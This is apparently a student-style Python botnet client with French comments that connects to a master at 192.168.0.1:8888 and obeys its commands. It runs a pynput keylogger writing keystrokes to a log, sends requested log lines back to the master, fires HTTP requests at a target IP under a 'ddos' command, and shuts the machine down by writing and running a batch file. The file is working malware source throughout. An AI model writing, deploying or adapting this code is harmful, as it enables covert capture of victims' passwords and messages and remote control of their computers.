import socket
from threading import Thread
from pynput import keyboard
import logging
import time
import requests
import os


class EmissionThread:                                                       #Cette classe va gérer l'émission des messages envoyés au master.

    def emission(self, reponse):
        msg = reponse
        msg = msg.encode()
        soc_tcp_e.send(msg)                                                 #Le message est envoyé au master.


class Get_log:                                                              #Cette classe va renvoyer le contenu du fichier "log_keylogger" au master.

    def __init__(self, numberlines):
        self.numberlines = numberlines                                      #Le paramètre numberlines représente le nombre de lignes renvoyées au master.

    def get_log(self):

        file = open('log_keylogger.txt', "r")                               #Ouverture du fichier log en mode lecture.
        contenu = file.readlines()                                          #Stockage des lignes dans la variable contenu.
        file.close()

        contenu = contenu[::-1]                                             #On inverse l'ordre des des lignes du fichier des logs.

        liste_renvoi = []
        if self.numberlines <= len(contenu):
            for log in (contenu[0:self.numberlines]):                       #Boucle qui renvoie le nombre de lignes demandé par le master.
                liste_renvoi.append(log)                                    #Envoie des logs au master.
        else:
            e_thread = Thread(target=EmissionThread().emission("Le nombre de lignes demandé est impossible!"))  #Création d'un thread qui lancera la méthode émission de la classe Emission Thread.
            e_thread.start()                                                                                    #Renvoi du message si le nombre de lignes demandé par le master est trop élevé.


        return liste_renvoi


class Dos:                                                                  #Cette classe va gérer le DOS.
    def __init__(self, ip, sec_ex):
        self.ip = ip                                                        #Le paramètre ip représente l'adresse ip du destinataire de la requête http.
        self.sec_ex = sec_ex                                                #Le paramètre sec_ex représente le "compte à rebours" avant l'éxecution de la requête.

    def dos(self):
        time.sleep(self.sec_ex)                                             #Le programme se met en pause pendant un certain nombre de secondes.
        try:
            requests.get('http://'+self.ip)                                 #La requête est effectuée.
        except requests.exceptions.ConnectionError:
            e_thread = Thread(target=EmissionThread().emission("Adresse ip injoignable!"))  # Création d'un thread qui lancera la méthode émission de la classe Emission Thread.
            e_thread.start()                                                                 #Gestion des erreurs : L'adresse ip entrée est injoignable.


class Stringmng:                                                            #La classe va gérer les messages entrants du master.
    def __init__(self,message):
        self.message = message

    def str_ddos(self):                                                     #La méthode str_ddos va créer une variable ip et sec à partir du message reçu.
        position = 1
        position_virgule = 0
        for car in self.message:
            position += 1
            if car == ",":
                position_virgule = position

        ip_address = self.message[5:position_virgule - 2]                  #A l'aide des séquences et de la position de la virgule, on peut déterminer l'ip et les sec.
        sec = int(self.message[position_virgule - 1:-1])                   #Transformation de type str en int pour la variable sec.

        return ip_address,sec

    def str_getlog(self):                                                  #La méthode str_getlog va déterminer le nombre de lignes demandé par le master.
        taille_message = len(self.message)
        nombrelignes = int(self.message[8:taille_message - 1])

        return nombrelignes


#Nous définissons notre fichier log (avec son chemin relatif ou absolu), ensuite nous définissons le niveau de sensibilité, puis le format de sortie.
logging.basicConfig(filename=("log_keylogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def start_log(key):                                                  #Fonction qui va saisir des entrées dans le fichier log.
    logging.info(str(key))                                           #(Ici, les touches du clavier)


listener = keyboard.Listener(on_press=start_log)                     #On démarre le listener.A chaque fois qu'il écoute quelque chose, il appelle la fonction start_log.


soc_tcp_e = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        #Création de la socket de connexion au master.

try:
    soc_tcp_e.connect(('192.168.0.1', 8888))                         #Connexion au master avec la socket.
except ConnectionRefusedError:                                                        #Gestion d'erreur tentative de connexion refusée.
    print("Le Master a refusé votre tentative de connexion.")

etat_log = False                                                     #Variable booléenne qui indiquera si le keylogger est lancé sur la machine.

try:
    while True:                                                                                             #Boucle de réception des messages du master.
        requeteduclient = soc_tcp_e.recv(1024)                                                              #Réception des messages grâce au socket.
        msg = requeteduclient.decode()
        print('Message reçu de la part du master : ', msg)

        if msg == 'start_log()':                                                                            #Si le message entrée est start_log().
            listener.start()                                                                                #On démarre le listener (le keylogger).
            etat_log = True                                                                                 #La variable booléenne passe à True car le listener est en cours d'exécution.
            e_thread = Thread(target=EmissionThread().emission("Le keylogger est activé!"))                 #Création d'un thread qui lancera la méthode émission de la classe Emission Thread.
            e_thread.start()                                                                                #Démarre le Thread.

        elif msg == 'stop_log()':
            listener.stop()                                                                                 #On arrête le keylogger.
            etat_log = False                                                                                #La variable booléenne passe à False car le listener est à l'arrêt.
            if not etat_log:
                e_thread = Thread(target=EmissionThread().emission("Le Keylogger est désactivé!"))          #Création d'un thread qui lancera la méthode émission de la classe Emission Thread.
                e_thread.start()                                                                            #Démarre le Thread.

        elif msg[:8] == "get_log(" and msg[-1:] == ")":
            numberlines = Stringmng(msg).str_getlog()                                                       #Stocke le nombre de lignes dans la variable retournée par la méthode.
            liste = Get_log(numberlines)                                                                    #Création d'une instance get_log.

            for ligne in liste.get_log():                                                                   #On envoie chaque ligne de la liste au master.
                e_thread = Thread(target=EmissionThread().emission(ligne))
                e_thread.start()

        elif msg[:5] == "ddos(" and msg[-1:] == ")":
            ip_address, sec = Stringmng(msg).str_ddos()                                                     #On stocke les variables (ip,temps) retournées de la méthode str_ddos.

            requete = Dos(ip_address, sec)                                                                  #Création d'une instance Dos.
            requete.dos()                                                                                   #Lance la méthode dos.

        elif msg == "shutdown()":
            file = open('shutdown.bat', "w")                                                                #Création du fichier "Shutdown.bat.
            file.write("shutdown.exe /s /t 00")                                                             #Script permettant d'arrêter l'ordinateur.
            file.close()

            os.system("shutdown.bat")                                                                       #On exécute le script.


except ConnectionResetError:                                                            #Gestion d'erreur: le Master s'est deconnecté.
    print("La connexion au master a été interrompue.")
except OSError:                                                                         #Gestion d'erreur: aucune connexion établie avec le master.
    print("Aucune connexion n'a été établie avec le master. Le programme est terminé.")
